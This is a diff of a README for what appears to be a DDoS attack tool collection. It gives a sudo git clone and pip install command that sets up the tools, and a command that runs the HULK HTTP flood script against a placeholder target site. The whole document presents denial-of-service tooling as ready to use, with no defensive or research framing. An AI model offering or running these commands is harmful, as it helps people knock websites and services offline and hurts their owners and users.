@@ -1,7 +1,8 @@
 # DDOS-ATTACK-Collection
 ## First Thanks For All Author Scrypt Gos Blase Ouer, And For More Info About Tools Please Red The REDME.ME in our Tools
 
-**Copy "sudo git clone https://github.com/4lT4lR/DDOS-ATTACK-LINUX.git && cd DDOS-ATTACK-LINUX && pip install -r requirements.txt" And Past on Terminal Command For setup all tools require**
+## For Download ald Setup Tool Copy the Command :-
+**sudo git clone https://github.com/4lT4lR/DDOS-ATTACK-LINUX.git && cd DDOS-ATTACK-LINUX && pip install -r requirements.txt**
 
 ## Hulk-ATTACK :- 
 **cd hulk && chmod +x * && python2 hulk.py YOUR_SITE_ATTACK**
